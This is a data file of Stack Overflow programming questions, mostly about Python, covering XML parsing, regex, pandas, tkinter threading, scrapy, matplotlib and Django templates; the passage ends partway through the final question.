39647459,6865270.0,2016-09-22 19:32:21+00:00,2,parse a section of an XML file with python,"<p>Im new to both python and xml. Have looked at the previous posts on the topic, and I cant figure out how to do exactly what I need to. Although it seems to be simple enough in principle.</p>

<pre><code>&lt;Project&gt;
 &lt;Items&gt;
  &lt;Item&gt;
   &lt;Code&gt;A456B&lt;/Code&gt;
   &lt;Database&gt;
    &lt;Data&gt;
     &lt;Id&gt;mountain&lt;/Id&gt;
     &lt;Value&gt;12000&lt;/Value&gt;
    &lt;/Data&gt;
    &lt;Data&gt;
     &lt;Id&gt;UTEM&lt;/Id&gt;
     &lt;Value&gt;53.2&lt;/Value&gt;
    &lt;/Data&gt;
   &lt;/Database&gt;
  &lt;/Item&gt;
  &lt;Item&gt;
   &lt;Code&gt;A786C&lt;/Code&gt;
   &lt;Database&gt;
    &lt;Data&gt;
     &lt;Id&gt;mountain&lt;/Id&gt;
     &lt;Value&gt;5000&lt;/Value&gt;
    &lt;/Data&gt;
    &lt;Data&gt;
     &lt;Id&gt;UTEM&lt;/Id&gt;
     &lt;Value&gt;&lt;/Value&gt;
    &lt;/Data&gt;
   &lt;/Database&gt;
  &lt;/Item&gt;
 &lt;/Items&gt;
&lt;/Project&gt; 
</code></pre>

<p>All I want to do is extract all of the Codes, Values and ID's, which is no problem.</p>

<pre><code>import xml.etree.cElementTree as ET

name = 'example tree.xml'
tree = ET.parse(name)
root = tree.getroot()
codes=[]
ids=[]
val=[]
for db in root.iter('Code'):
    codes.append(db.text)
for ID in root.iter('Id'):
    ids.append(ID.text)
for VALUE in root.iter('Value'):
    val.append(VALUE.text)
print codes
print ids
print val

['A456B', 'A786C']
['mountain', 'UTEM', 'mountain', 'UTEM']
['12000', '53.2', '5000', None]
</code></pre>

<p>I want to know which Ids and Values go with which Code. Something like a dictionary of dictionaries maybe OR perhaps a list of DataFrames with the row index being the Id, and the column header being Code. </p>

<p>for example</p>

<p>A456B = {mountain:12000, UTEM:53.2}<br>
A786C = {mountain:5000, UTEM: None}</p>

<p>Eventually I want to use the Values to feed an equation.</p>

<p>Note that the real xml file might not contain the same number of Ids and Values in each Code. Also, Id and Value might be different from one Code section to another.</p>

<p>Sorry if this question is elementary, or unclear...I've only been doing python for a month :/</p>
"
39751242,6863372.0,2016-09-28 15:04:08+00:00,2,Regex to extract titles from the text,"<p>Can anyone help with the regex to extract the text phrases after 'Title:' from the following text: (have just bolded the text to clearly depict the portion to be extracted)</p>

<pre>Title: <b>Anorectal Fistula (Fistula-in-Ano)</b> Procedure Code(s): 



Effective date: 7/1/07

Title:

<b>2003247</b> 

or previous effective dates) 



Title: 

<b>ST2 Assay for Chronic Heart Failure</b> 

Description/Background 

Heart Failure 

HF is one among many cardiovascular diseases that comprises a major cause of morbidity 
and mortality worldwide. The term âheart failureâ (HF) refers to a complex clinical syndrome .</pre>

<p>I am using the regex: <code>(?:Title: \n+(.*))|(?:Title:\n+(.*))|(?&lt;=Title: )(.*)(?=Procedure)</code></p>

<p>However, it doesn't seem to capture the terms correctly! I am using Python 2.7.12</p>
"
40096601,545299.0,2016-10-17 22:21:41+00:00,2,Using print as class method name in Python,"<p>Does Python disallow using <code>print</code> (or other reserved words) in class method name?</p>

<p><code>$ cat a.py</code></p>

<pre><code>import sys
class A:
    def print(self):
        sys.stdout.write(""I'm A\n"")
a = A()
a.print()
</code></pre>

<p><code>$ python a.py</code></p>

<pre><code>File ""a.py"", line 3
  def print(self):
          ^
  SyntaxError: invalid syntax
</code></pre>

<p>Change <code>print</code> to other name (e.g., <code>aprint</code>) will not produce the error. It is surprising to me if there's such restriction. In C++ or other languages, this won't be a problem:</p>

<pre><code>#include&lt;iostream&gt;
#include&lt;string&gt;
using namespace std;

class A {
  public:
    void printf(string s)
    {
      cout &lt;&lt; s &lt;&lt; endl;
    }
};


int main()
{
  A a;
  a.printf(""I'm A"");
}
</code></pre>
"
40096278,2835670.0,2016-10-17 21:52:57+00:00,2,"Creating histograms in pandas with columns with equidistant base, not proportional to the range","<p>I am creating an histogram in pandas simply using:</p>

<pre><code>train_data.hist(""MY_VARIABLE"", bins=[0,5, 10,50,100,500,1000,5000,10000,50000,100000])
</code></pre>

<p>(train_data is a pandas df).</p>

<p>The problem is that, since the range <code>[50000,100000]</code> is so large, I can barely see the small ranges <code>[0,5]</code> or <code>[5,10]</code> etc. I would like the histogram to have equidistant bars on the x-axis, not proportional to the range. Is this possible?</p>
"
40095860,704972.0,2016-10-17 21:22:20+00:00,2,Mismatch between scrapy response status and response url,"<p>A web site consists of two URLs. One redirects to the other.</p>

<pre><code>&gt; curl -I 'http://example.com/virtualpage'
HTTP/1.1 301 Moved Permanently
...

&gt; curl -I 'http://example.com/actualpage'
HTTP/1.1 200 OK
...
</code></pre>

<p>With <code>REDIRECT_ENABLED = False</code> in <code>settings.py</code> and the spider</p>

<pre><code>class MySpider(CrawlSpider):
    name = ""Spidey""
    handle_httpstatus_list = [301, 302]
    start_urls = [
        'http://example.com/virtualpage',
    ]
    rules = (
        Rule(LinkExtractor(restrict_xpaths='//a'),
             callback='my_parse, follow=True),
    )

    def my_parse(self, response):
        print response.status, response.url
</code></pre>

<p>the output of the print statement above makes no sense. It shows</p>

<pre><code>200 http://example.com/virtualpage
200 http://example.com/actualpage
</code></pre>

<p>In other words, the redirected URL ('<a href=""http://example.com/virtualpage"" rel=""nofollow"">http://example.com/virtualpage</a>') remains intact in <code>response.url</code>, but is accompanied with the status of the page it was redirected to! If there is some logic to this feature, I don't see it.</p>

<p>As you see from <code>handle_httpstatus_list = [301, 302]</code> I'm trying to
handle 301/302 responses myself. How can I do that, besides or instead
of setting <code>handle_httpstatus_list</code>?</p>
"
40095712,2780360.0,2016-10-17 21:10:28+00:00,2,When to apply(pd.to_numeric) and when to astype(np.float64) in python?,"<p>I have a pandas DataFrame object named <code>xiv</code> which has a column of <code>int64</code> Volume measurements.  </p>

<pre><code>In[]: xiv['Volume'].head(5)
Out[]: 

0    252000
1    484000
2     62000
3    168000
4    232000
Name: Volume, dtype: int64
</code></pre>

<p>I have read other posts (like <a href=""http://stackoverflow.com/questions/21287624/pandas-dataframe-column-type-conversion?rq=1"">this</a> and <a href=""http://stackoverflow.com/questions/15891038/pandas-change-data-type-of-columns"">this</a>) that suggest the following solutions.  But when I use either approach, it doesn't appear to change the <code>dtype</code> of the underlying data:</p>

<pre><code>In[]: xiv['Volume'] = pd.to_numeric(xiv['Volume'])

In[]: xiv['Volume'].dtypes
Out[]: 
dtype('int64')
</code></pre>

<p>Or...</p>

<pre><code>In[]: xiv['Volume'] = pd.to_numeric(xiv['Volume'])
Out[]: ###omitted for brevity###

In[]: xiv['Volume'].dtypes
Out[]: 
dtype('int64')

In[]: xiv['Volume'] = xiv['Volume'].apply(pd.to_numeric)

In[]: xiv['Volume'].dtypes
Out[]: 
dtype('int64')
</code></pre>

<p>I've also tried making a separate pandas <code>Series</code> and using the methods listed above on that Series and reassigning to the <code>x['Volume']</code> obect, which is a <code>pandas.core.series.Series</code> object.</p>

<p>I have, however, found a solution to this problem using the <code>numpy</code> package's <code>float64</code> type - <strong><em>this works but I don't know why it's different</em></strong>.</p>

<pre><code>In[]: xiv['Volume'] = xiv['Volume'].astype(np.float64)

In[]: xiv['Volume'].dtypes
Out[]: 
dtype('float64') 
</code></pre>

<p>Can someone explain how to accomplish with the <code>pandas</code> library what the <code>numpy</code> library seems to do easily with its <code>float64</code> class; that is, convert the column in the <code>xiv</code> DataFrame to a <code>float64</code> in place.</p>
"
40025181,995862.0,2016-10-13 15:29:37+00:00,2,How to get the database and table name from a ReQL query,"<p>Suppose I have the following RethinkDB query (as printed in iPython):</p>

<pre><code>In [32]: data_to_archive
Out[32]: &lt;RqlQuery instance: r.db('sensor_db').table('sensor_data').filter(lambda var_2: (r.row['timestamp'] &lt; (r.now() - r.expr(259200.0)))) &gt;
</code></pre>

<p>The query is on the database <code>sensor_db</code> and table <code>sensor_data</code>, as is clear from the printed output. Is there any way I can retrieve this information as an attribute of the <code>RqlQuery</code> instance?</p>

<p>(The reason I want to do this is to write succinct code: the query, the database, and the table are currently all passed separated as input arguments to a function, but the latter two are actually contained in the former).</p>
"
40095686,7033175.0,2016-10-17 21:08:48+00:00,2,Multi-dimensional outer-product in python,"<p>I was doing MNIST dataset and trying to get a outer product of my two vectors <code>w_i(ith class)</code> and <code>a_k(kth sample)</code>.</p>

<p>The <code>w_i</code>, for <code>i = 0...9</code>, has 784 coordinates.</p>

<p>The <code>a_k</code>, for <code>k = 1...n</code>, also has 784 coordinates.</p>

<p>I created two arrays <code>w_ij</code> and <code>a_ij</code> which contain all ten classes and k samples. The shape of <code>w_ij</code> is (10, 784) and <code>a_ij</code> is (n, 784).</p>

<p>I was trying to get a result something like:</p>

<pre><code>[[w_0 dot a_1, w_0 dot a_2, ... , w_0 dot a_n], # (first row)
[w_1 dot a_1, w_1 dot a_2, ..., w_1 dot a_n], # (second row)
...,
[w_9 dot a_1, ..., w_9 dot a_n]] # (nth row)
</code></pre>

<p>So the shape of array should be like <code>(10, n)</code>. I tried to use <code>scipy.outer(w_ij, a_k)</code> or <code>scipy.multiply.outer(w_ij, a_k)</code>. However, it led me to a result whose shape is <code>(7840, 784*n)</code>. Could someone direct me to the right path?</p>
"
40025616,6234620.0,2016-10-13 15:51:14+00:00,2,multithreading from a tkinter app,"<p>I have a tkinter application that runs on the main thread. After receiving some input from the user, a new thread is created to perform functions in a separate class. The main thread continues to a Toplevel progress window. </p>

<p>My question is, how can I communicate to the main thread when the second thread has finished its tasks, in order to close the progress window?</p>

<pre><code>import tkinter as tk
from tkinter import ttk
from threading import Thread
import time


class Application:
    def __init__(self, master):
        # set main window
        frame = tk.Frame(master, width=300, height=100)
        frame.pack(fill=tk.BOTH)

        # button widget
        run_button = tk.Button(frame, text=""GO"", command=self.do_something)
        run_button.pack()

        # simulate some gui input from user
        self.user_input = ""specified by user""

    def do_something(self):
        thread1 = Thread(target=FunctionClass, args=(self.user_input,))
        thread1.start()  # launch thread
        ProgressWindow()  # main thread continues to new tkinter window


class ProgressWindow(tk.Toplevel):
    """""" displays progress """"""

    def __init__(self):
        super().__init__()

        self.progress = ttk.Progressbar(
            self, orient=""horizontal"", length=300, mode=""indeterminate"")
        self.progress.pack()
        self.note = ""Processing data...""
        self.p_label = tk.Label(self, text=self.note)
        self.p_label.pack()
        self.progress.start(50)


class FunctionClass:
    """""" thread1 works on this class """"""

    def __init__(self, user_data):
        self.user_data = user_data
        self.do_something_else()

    def do_something_else(self):
        # simulate thread 1 working
        time.sleep(3)
        print(""Thread1 job done"")


if __name__ == ""__main__"":
    root = tk.Tk()
    Application(root)
    root.mainloop()
</code></pre>

<p><strong>* UPDATE *</strong></p>

<p>tkinter's <code>event_generate</code> as suggested by iCart works well. See code update below.</p>

<pre><code>import tkinter as tk
from tkinter import ttk, messagebox
from threading import Thread
import time


class Application:
    def __init__(self, master):
        # set main window
        frame = tk.Frame(master, width=300, height=100)
        frame.pack(fill=tk.BOTH)

        # button widget
        run_button = tk.Button(frame, text=""GO"", command=self.do_something)
        run_button.pack()

        # simulate some gui input from user
        self.user_input = ""specified by user""

    def do_something(self):
        thread1 = Thread(target=FunctionClass, args=(self.user_input,))
        thread1.start()  # launch thread
        ProgressWindow()  # main thread continues to new tkinter window


class ProgressWindow(tk.Toplevel):
    """""" displays progress """"""

    def __init__(self):
        super().__init__()

        self.progress = ttk.Progressbar(self, orient=""horizontal"", length=300, mode=""indeterminate"")
        self.progress.pack()
        self.note = ""Processing data...""
        self.p_label = tk.Label(self, text=self.note)
        self.p_label.pack()
        self.progress.start(50)


class FunctionClass:
    """""" thread1 works on this class """"""

    def __init__(self, user_data):
        self.user_data = user_data
        self.do_something_else()

    def do_something_else(self):
        # simulate thread 1 working
        time.sleep(3)
        print(""Thread1 job done"")
        # call &lt;&lt;stop&gt;&gt; virtual event (unsure if 'tail' is necessary here)
        root.event_generate(""&lt;&lt;stop&gt;&gt;"", when=""tail"")


def end_program(*args):
    """""" called with tkinter event_generate command after thread completion """"""
    messagebox.showinfo(""Complete"", ""Processing Complete"")
    root.destroy()

if __name__ == ""__main__"":
    root = tk.Tk()
    Application(root)
    root.bind(""&lt;&lt;stop&gt;&gt;"", end_program)   # bind to event
    root.mainloop()
</code></pre>
"
40096846,7033405.0,2016-10-17 22:47:21+00:00,2,Put list into dict with first row header as keys,"<p>I have the following python list:</p>

<pre><code>[['A,B,C,D'],
 ['1,2,3,4'],
 ['5,6,7,8']]
</code></pre>

<p>How can I put it into a dict and use the first sub list as the keys?:</p>

<pre><code>{'A': '1',
 'B': '2',
 'C': '3',
 'D': '4'}
{'A': '5',
 'B': '6',
 'C': '7',
 'D': '8'}
</code></pre>

<p>Thanks in advance!</p>
"
40097086,5577564.0,2016-10-17 23:13:21+00:00,2,Plotting asymmetric error bars Matplotlib,"<p>So I have three sets of data:</p>

<pre><code>min_data = np.array([ 0.317, 0.312, 0.305, 0.296, 0.281, 0.264, 0.255, 
0.237, 0.222, 0.203, 0.186, 0.17, 0.155, 0.113, 0.08])

avg_data = np.array([ 0.3325, 0.3235, 0.3135, 0.30216667, 0.2905, 0.27433333, 
0.26116667, 0.24416667, 0.22833333, 0.20966667, 0.19366667, 0.177, 
0.16316667, 0.14016667, 0.097])

max_data = np.array([ 0.346, 0.331, 0.32, 0.31, 0.299, 0.282, 0.266, 0.25, 
0.234, 0.218, 0.204, 0.187, 0.175, 0.162, 0.115])
</code></pre>

<p>I need to plot this data with error bars. </p>

<p>I have attempted:</p>

<pre><code>x = np.linspace(0, 100, 15)
err = [min_data, max_data]
plt.errorbar(x, avg_data, 'bo', yerr=err)

TypeError: errorbar() got multiple values for argument 'yerr'
</code></pre>

<p>The final graph should look like this:</p>

<pre><code>plt.plot(x[::-1], avg_data, 'ro')
plt.plot(x[::-1], min_data, 'bo')
plt.plot(x[::-1], max_data, 'bo')
</code></pre>

<p><a href=""https://i.stack.imgur.com/JTZAK.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/JTZAK.png"" alt=""enter image description here""></a></p>

<p>Where the blue points represent where the error bars should be located.</p>

<p>All the documentation I have been able to find only allows asymmetric errors that is equal in + and - y directions.</p>

<p>Thank you</p>
"
39645153,5182538.0,2016-09-22 17:17:44+00:00,2,The area of the intersection of two ovals (ellipses)?,"<p>I need to calculate the amount of two oval intersects in a python program.
I know in <a href=""https://pypi.python.org/pypi/Shapely"" rel=""nofollow"">shaply</a> there is a function that return true if two object has intersects. As like as this:</p>

<pre><code>from shapely.geometry import Polygon
p1=Polygon([(0,0),(1,1),(1,0)])
p2=Polygon([(0,1),(1,0),(1,1)])
print p1.intersects(p2)
</code></pre>

<p>is there any library or function That help me?
Thanks.</p>
"
40097088,3509416.0,2016-10-17 23:13:40+00:00,2,BS4 get XML tag variables,"<p>I am playing around with web scraping using bs4 and trying to get the title and color tag from this line of xml <code>&lt;graph gid=""1"" color=""#000000"" balloon_color=""#000000"" title=""Approve""&gt;</code></p>

<p>The output result would be a dict something along the lines of <code>{'title':'approve', 'color':'#000000'}</code></p>

<p>The page where the xml is <a href=""http://charts.realclearpolitics.com/charts/1044.xml"" rel=""nofollow"">here</a></p>

<p>I've already written this function which is by no means efficient, but would like the titles of my dataframe to be the result of the <code>title</code> rather than a manually inputted value. So rather than <code>GID1</code> it would read <code>Approve</code> or <code>Obama</code> or whatever the result of title is. </p>

<pre><code>def rcp_poll_data(xml):
    soup=bs(xml,""xml"")
    dates = soup.find('series')
    datesval = dates.findChildren(string=True)
    del datesval[-7:]
    obama = soup.find('graph', { ""gid"" : ""1"" })
    obamaval = obama.findChildren(string=True)
    romney = soup.find('graph', { ""gid"" : ""2"" })
    romneyval = romney.findChildren(string=True)
    result = pd.DataFrame({'date':pd.to_datetime(datesval), 'GID1':obamaval, 'GID2':romneyval})
    return result
</code></pre>

<p>I'm using bs4 and struggling to find the right terminology that would get me there. Are these tags i'm trying to isolate, or elements, or attributes?</p>

<p>This isn't a professional thing i'm just nurdling around for fun. So any help to get me slightly closer would be great. (i'm using python 3)</p>
"
39755981,3316031.0,2016-09-28 19:22:13+00:00,2,Explain how pandas DataFrame join works,"<p>Why does inner join work so strange in pandas?</p>

<p><strong>For example:</strong></p>

<pre><code>import pandas as pd
import io

t1 = ('key,col1\n'
      '1,a\n'
      '2,b\n'
      '3,c\n'
      '4,d')

t2 = ('key,col2\n'
      '1,e\n'
      '2,f\n'
      '3,g\n'
      '4,h')


df1 = pd.read_csv(io.StringIO(t1), header=0)
df2 = pd.read_csv(io.StringIO(t2), header=0)

print(df1)
print()
print(df2)
print()
print(df2.join(df1, on='key', how='inner', lsuffix='_l'))
</code></pre>

<p><strong>Outputs:</strong></p>

<pre><code>   key col1
0    1    a
1    2    b
2    3    c
3    4    d

   key col2
0    1    e
1    2    f
2    3    g
3    4    h

   key_l col2  key col1
0      1    e    2    b
1      2    f    3    c
2      3    g    4    d
</code></pre>

<p>If I don't specify <code>lsuffix</code>, it says</p>

<pre><code>ValueError: columns overlap but no suffix specified: Index(['key'], dtype='object')
</code></pre>

<p>Does this function work differently from SQL's JOIN? Why does it want to create an extra 'key' column with a suffix? Why are there only 3 rows?
I expected it to output something like this:</p>

<pre><code>   key col1 col2
0    1    a    e
1    2    b    f
2    3    c    g
3    4    d    h
</code></pre>
"
39755742,4995876.0,2016-09-28 19:07:08+00:00,2,pandas histogram with by: possible to make axes uniform?,"<p>I am using the option to generate a separate histogram of a value for each group in a data frame like so (example code from documentation)</p>

<pre><code>data = pd.Series(np.random.randn(1000))
data.hist(by=np.random.randint(0, 4, 1000), figsize=(6, 4))
</code></pre>

<p>This is great, but what I am not seeing is a way to set and standardize the axes. Is this possible?</p>

<p>To be specific, I would like to specify the x and y axes of the plots so that the y axis in particular has the same range for all plots. Otherwise it can be hard to compare distributions to one another.</p>
"
40022102,4971554.0,2016-10-13 13:16:54+00:00,2,Remove spaces before newlines,"<p>I need to remove all spaces before the newline character throughout a string.</p>

<pre><code>string = """"""
this is a line       \n
this is another           \n
""""""
</code></pre>

<p>output:</p>

<pre><code>string = """"""
this is a line\n
this is another\n
""""""
</code></pre>
"
39644478,5895412.0,2016-09-22 16:38:08+00:00,2,Django Template Tags Creating Spaces,"<p>I am working on a Django site which is live at <a href=""http://petervkay.pythonanywhere.com/police_archive/officer/1903/"" rel=""nofollow"">this site</a>.  I am getting unwanted spaces in my output caused by unwanted whitespace in the HTML.  </p>

<p>For instance, ""01-1737 , Civilian Review Authority , INAPPROPRIATE LANGUAGE, SUSTAINED,"" has extra spaces before most of the commas.</p>

<p>I have found other posts with similar problems, but no solution has worked for me. I tried the {% spaceless %} tag, but that didn't work.  The only thing that did work for me was putting all of the template tags in the for loop on a single line, but I'd really like to find a more readable solution than this.</p>

<p>Here is the code for the Django template:</p>

<pre><code>{% extends 'police_archive/base.html' %}

{% block content %}
    &lt;h2&gt; {{officer.first_name}} {{officer.last_name}}, badge #{{officer.badge}} &lt;/h2&gt;
    &lt;p&gt;&lt;strong&gt;Department:&lt;/strong&gt; {{officer.department}}&lt;/p&gt;
    &lt;h2&gt;Complaints&lt;/h2&gt;
    &lt;ul&gt;
        {% for details in details_list %}
            &lt;li&gt;


                {% if details.incident.case_number %}
                    &lt;a href='/police_archive/complaint/{{details.incident.case_number}}'&gt;
                         {{details.incident.case_number}}
                    &lt;/a&gt;
                {% else %}
                 No Case Number Found
                {% endif %}


                {% if details.incident.office %}
                 , {{details.incident.get_office_display}}
                {% else %}
                , No office found
                {% endif %}

                {% if details.allegation %}
                 , {{details.allegation}}
                {% endif %}

                {% if details.finding %}
                 , {{details.finding}}
                {% endif %}

                {% if details.action %}
                 , {{details.action}}
                {% endif %}  

            &lt;/li&gt;
        {% endfor %}


{% endblock %}
</code></pre>
"
39755289,6365534.0,2016-09-28 18:40:16+00:00,2,Understanding Django Q - Dynamic,"<p>I'm reading <a href=""http://www.michelepasin.org/blog/2010/07/20/the-power-of-djangos-q-objects/"" rel=""nofollow"">this article</a> on dynamically generating Q objects. I understand (for the most part) Q objects but I'm not understanding how the author specifically is doing this example:</p>

<pre><code># string representation of our queries
&gt;&gt;&gt; predicates = [('question__contains', 'dinner'), ('question__contains', 'meal')]

# create the list of Q objects and run the queries as above..
&gt;&gt;&gt; q_list = [Q(x) for x in predicates]

&gt;&gt;&gt; Poll.objects.filter(reduce(operator.or_, q_list))
[&lt;Poll: what shall I make for dinner&gt;, &lt;Poll: what is your favourite meal?&gt;]
</code></pre>

<p>What I specifically don't get is the list comprehension. A <code>Q</code> object is formatted with arbitrary keywords arguments as such <code>Q(question__contains='dinner')</code>. </p>

<p>If doing it like the author suggests with the list comprehension, won't that effectively just place a tuple inside a <code>Q</code> object on each iteration? Like such: <code>Q(('question__contains', 'dinner'))</code>. </p>

<p>I'm not sure how this code produces a correctly formatted <code>Q</code> object. </p>
"
39755232,4471028.0,2016-09-28 18:37:03+00:00,2,Python append column header & append column values from list to csv,"<p>I am trying to append column header (hard-coded) and append column values from list to an existing csv. I am not getting the desired result. </p>

<p>Method 1 is appending results on an existing csv file. Method 2 clones a copy of existing csv into temp.csv. Both methods don't get me the desired output I am looking for. In Results 1, it just appends after the last row cell. In results 2, all list values append on each row. Expected results is what I am looking for. </p>

<p>I have included my code below. Appreciate any input or guidance. </p>

<p><strong>Existing CSV Test.csv</strong></p>

<pre><code>Type,Id,TypeId,CalcValues
B,111K,111Kequity(long) 111K,116.211768
C,111N,B(long) 111N,0.106559957
B,111J,c(long) 111J,20.061634
</code></pre>

<p><strong>Code - Method 1 &amp; 2</strong></p>

<pre><code>final_results = ['0.1065599566767107', '0.0038113334533441123', '20.061623176440904']

# Method1
csvfile = ""test.csv""
with open(csvfile, ""a"") as output:
    writer = csv.writer(output, lineterminator='\n')
    for val in final_results:
        writer.writerow([val])  

# Method2
with open(""test.csv"", 'rb') as input, open('temp.csv', 'wb') as output:
    reader = csv.reader(input, delimiter = ',')
    writer = csv.writer(output, delimiter = ',')

    all = []
    row = next(reader)
    row.insert(5, 'Results')
    all.append(row)

    for row in reader:
        for i in final_results:
            print type(i)
            row.insert(5, i)
        all.append(row)
    writer.writerows(all)
</code></pre>

<p><strong>Results for Method 1</strong></p>

<pre><code>Type,Id,TypeId,CalcValues
B,111K,111Kequity(long) 111K,116.211768
C,111N,B(long) 111N,0.106559957
B,111J,c(long) 111J,20.0616340.1065599566767107
0.0038113334533441123
20.061623176440904
</code></pre>

<p><strong>Results for Method 2</strong></p>

<pre><code>Type,Id,TypeId,CalcValues,Results
B,111K,111Kequity(long) 111K,116.211768,0.1065599566767107,20.061623176440904,0.0038113334533441123
C,111N,B(long) 111N,0.106559957,0.1065599566767107,20.061623176440904,0.0038113334533441123
B,111J,c(long) 111J,20.061634,0.1065599566767107,20.061623176440904,0.0038113334533441123
</code></pre>

<p><strong>Expected Result</strong></p>

<pre><code>Type,Id,TypeId,CalcValues,ID
B,111K,111Kequity(long) 111K,116.211768,0.1065599566767107
C,111N,B(long) 111N,0.106559957,20.061623176440904
B,111J,c(long) 111J,20.061634,0.0038113334533441123
</code></pre>
"
39644517,5987307.0,2016-09-22 16:39:55+00:00,2,Slice list of lists without numpy,"<p>In Python, how could I slice my list of lists and get a sub list of lists without numpy?</p>

<p>For example, get a list of lists from A[1][1] to A[2][2] and store it in B:</p>

<pre><code>A = [[1,  2,  3,  4 ],
     [11, 12, 13, 14],
     [21, 22, 23, 24],
     [31, 32, 33, 34]]

B = [[12, 13],
     [22, 23]]
</code></pre>
"
40097366,6889649.0,2016-10-17 23:47:22+00:00,2,Python 3.5 dictionary comparison,"<p>I am trying to compare all elements of one dictionary to make sure they are in a second with the correct number. I am new at Python so I know there is something simple I am probably missing and I have been working on this one problem for hours so my code is likely very ugly and wrong. Here is an example of what I have so far.</p>

<pre><code>try:       
    for key in dict_one:
        if dict_two.get(key, 0) == dict_one[key]:
           del dict_one[key]
           if dict_one[key] &lt; 0 :                
              return False
        else:
             return True
except KeyError:
   pass
</code></pre>

<p>I have tried <code>all(dict_two.get(key,0))</code> as well and it didn't work.  The final output should check that you can spell a word from <code>dict_two</code> using the words in <code>dict_one</code> <code>True</code> if you can, <code>False</code> if you can't so if <code>dict_two</code> word requires three Es then <code>dict_one</code> should have 3 Es or return false. Or two Ns if you were spelling bunny ex <code>dict_one = {b: 1, u: 1, n:1, y:1, x: 3}</code> and <code>dict_two ={b: 1, u: 1. n: 2, y:1}</code> <code>False</code> because you need 2 Ns in the word and <code>dict_one</code> only has one. </p>

<p>I can get <code>dict_two</code> to populate correctly when I enter a word and <code>dict_one</code> properly pulls random numbers and amounts of those numbers. And I can get them to compare properly for letters included in each, I just can't get it to produce right answer of <code>True</code> or <code>False</code> for the number of letters needed. I feel I am close to an answer, but then just make it worse when I try new things and dig my hole deeper. </p>

<p>Thank you! </p>
"
39644885,2738025.0,2016-09-22 17:01:28+00:00,2,Generic binary operation in a class definition?,"<p>I am writing a tiny linear algebra module in Python 3, and there are a number of binary operators to define. Since each definition of a binary operator is essentially the same with only the operator itself changed, I would like to save some work by writing a generic binary operator definition only once.</p>

<p>For example:</p>

<pre><code>class Vector(tuple):
    def __new__(self, x):
        super().__new__(x)

    # Binary operators

    def __add__(self, xs):
        try:
            return Vector(a + x for a, x in zip(self, xs)))
        except:
            return Vector(a + x for a in self)

    def __and__(self, xs):
        try:
            return Vector(a &amp; x for a, x in zip(self, xs))
        except:
            return Vector(a &amp; x for a in self)

    ... # mul, div, or, sub, and all other binary operations
</code></pre>

<p>The binary operators above all have the same form. Only the operator is changed. I wonder if I could instead write all operators at once, something like this:</p>

<pre><code>def __bop__(self, xs):
    bop = get_bop_somehow()
    try:
        return Vector(bop(a, x) for a, x in zip(self, xs)))
    except:
        return Vector(bop(a, x) for a in self)
</code></pre>

<p>I've heard that Python can do magical things with the <code>__getattr__</code> method, which I tried to use to extract the name of the operator like so:</p>

<pre><code>def __getattr__(self, name):
    print('Method name:', name.strip('_'))
</code></pre>

<p>But, unfortunately, this only works when called using the full method name, not when an operator is used. How can I write a one-size-fits-all binary operator definition?</p>
"
39754822,27657.0,2016-09-28 18:14:15+00:00,2,scrapy run spider from path,"<p>A number of suggestions on running scrapy suggest doing this in order to start scrapy via script, or to debug in an IDE, etc:</p>

<pre><code>from scrapy import cmdline

cmdline.execute((""scrapy runspider spider-file-name.py"").split())
</code></pre>

<p>This works, so long as the script is placed in the project directory, but if not try to give it an absolute or relative path. For example:</p>

<pre><code>import os

from scrapy import cmdline

this_file_path = os.path.dirname(os.path.realpath(__file__))
base_path = this_file_path.replace('bootstrap', '')
full_path = base_path + ""path/to/spiders/some-spider.py""
print full_path

cmdline.execute((""scrapy runspider "" + full_path).split())
</code></pre>

<p>With this, I get:</p>

<pre><code>2016-09-28 10:49:29 [scrapy] INFO: Scrapy 1.1.2 started (bot: scrapybot)
2016-09-28 10:49:29 [scrapy] INFO: Overridden settings: {}
Usage
=====
  scrapy runspider [options] &lt;spider_file&gt;

spider-main.py: error: Unable to load '/Users/name/intellij-workspace/crawling/scrape/scrape/spiders/some-spider.py': No module named items
</code></pre>

<p>Is there a way to run and debug scrapy spiders from an absolute path? Ideally, I need to have this to debug in an IDE.</p>
"
40097194,579477.0,2016-10-17 23:25:41+00:00,2,Python loop through Dataframe 'Series' object has no attribute,"<p>Using pandas version 0.19.0, I have a dataframe with compiled regular expressions inside.  I want to loop over the dataframe and see if any of the regular expressions match a value.  I can do it with two for loops, but I can't figure out how to do it so that it'll return a same sized dataframe.</p>

<pre><code>import pandas as pd
import re

inp = [{'c1':re.compile('a'), 'c2':re.compile('b')}, {'c1':re.compile('c'),'c2':re.compile('d')}, {'c1':re.compile('e'),'c2':re.compile('f')}]
df = pd.DataFrame(inp)
for i,v in df.items():
  for a in v:
    if (a.match('a')):
      print(""matched"")
    else:
      print(""failed"")
</code></pre>

<p>This fails:</p>

<pre><code>[a.match('a') for a in [v for i,v in df.items()]]
</code></pre>

<blockquote>
  <p>AttributeError: 'Series' object has no attribute 'match'</p>
</blockquote>

<p>What I want:</p>

<pre><code>[a.match('a') for a in [v for i,v in df.items()]]
              c1                                         c2
0   &lt;_sre.SRE_Match object; span=(0, 1), match='a'&gt;     None
1   None                                                None
2   None                                                None
</code></pre>
"
39754222,1187968.0,2016-09-28 17:36:43+00:00,2,Python - Convert string-numeric to float,"<p>I have the following string numeric values, and need to keep only the digit and decimals. I just can't find a right regular expression for this. </p>

<pre><code>s = [
      ""12.45-280"", # need to convert to 12.45280
      ""A10.4B2"", # need to convert to 10.42
]
</code></pre>
"
40022757,7013973.0,2016-10-13 13:44:08+00:00,2,Finding out where analytics should be defined,"<p>I am working with Google Analytics api in python and keep getting the error</p>

<pre><code>NameError: name 'analytics' is not defined. 
</code></pre>

<p>I have been searching for several days on the <code>analytics</code> api site and on StackOverflow for the answer. If someone could please point me in the direction of the right documentation or help me out here that would be greatly appreciated. Attached is the code that I have so far.  </p>

<pre><code>from apiclient.http import MediaFileUpload
from apiclient.errors import HttpError

try:
  media = MediaFileUpload('Bing_Ad_Test.csv',
                          mimetype='application/octet-stream',
                          resumable=False)
  daily_upload = analytics.management().uploads().uploadData(
      accountId='',
      webPropertyId='',
      customDataSourceId='',
      media_body=media).execute()

except TypeError, error:
  # Handle errors in constructing a query.
  print 'There was an error in constructing your query : %s' % error

except HttpError, error:
  # Handle API errors.
  print ('There was an API error : %s : %s' %
         (error.resp.status, error.resp.reason))
</code></pre>
"
39753972,2184364.0,2016-09-28 17:23:00+00:00,2,"How to get the width of a matplotlib text, including the padded bounding box?","<p>I know how to get the width of the text:</p>

<pre><code>import matplotlib.pyplot as plt
from matplotlib.patches import BoxStyle

xpos, ypos = 0, 0
text = 'blah blah'

